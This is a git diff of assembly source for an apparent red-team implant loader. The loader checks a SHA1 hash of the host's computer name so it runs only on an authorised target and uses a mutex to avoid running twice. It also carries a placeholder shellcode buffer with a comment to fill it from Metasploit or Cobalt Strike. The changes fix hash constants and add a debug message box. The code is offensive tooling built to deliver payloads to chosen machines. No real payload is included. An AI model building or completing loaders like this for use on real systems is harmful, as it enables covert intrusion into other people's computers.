@@ -40,9 +40,10 @@ GenerateHash PROTO :DWORD,:DWORD
                      
 ; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
 strMutexName  db  "Global\Stufus",0    
+strOK db "OK",0
 
 ; The hash of the authorised NetBIOS computer name
-hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,A3h,76h,0E5h,23h,0E6h,0D6h,A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh
+hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,0A3h,76h,0E5h,23h,0E6h,0D6h,0A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh
 
 ; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
 ; and some experimentation
@@ -53,7 +54,7 @@ CNF_ComputerNamePhysicalDnsFullyQualified equ 7
 
 ; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
 MS_CALG_SHA1 equ 8004h    
-MS_CALG_SHA1_HASHSIZE equ 20h ; The actual size of a returned SHA1 hash
+MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
 shellcode db 90h,90h
@@ -98,6 +99,8 @@ CheckExecution PROC uses esi edi
  mov esi, offset hashSHA1CompterName ; The calculated hash is in edi, the stored hash is now in esi
  repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
  jnz badhash                    ; If they are different, the hash was incorrect
+
+ invoke MessageBox, NULL, addr strOK, NULL, 0 ; Debug for now, display this if the code is ok
 
  ; Check to see whether the implant is already running or not
  invoke MutexCheck 
@@ -198,7 +201,7 @@ LOCAL dwHashSizeLen:DWORD
          .if eax!=NULL
            mov esi, eax
            invoke CryptGetHashParam, hHash, HP_HASHVAL, esi, addr dwHashSize, NULL
-           .if (eax!=NULL && dwHashSize==20h)
+           .if (eax!=NULL && dwHashSize==MS_CALG_SHA1_HASHSIZE)
              mov eax, esi  ; Hash is now stored in esi
            .endif
          .endif
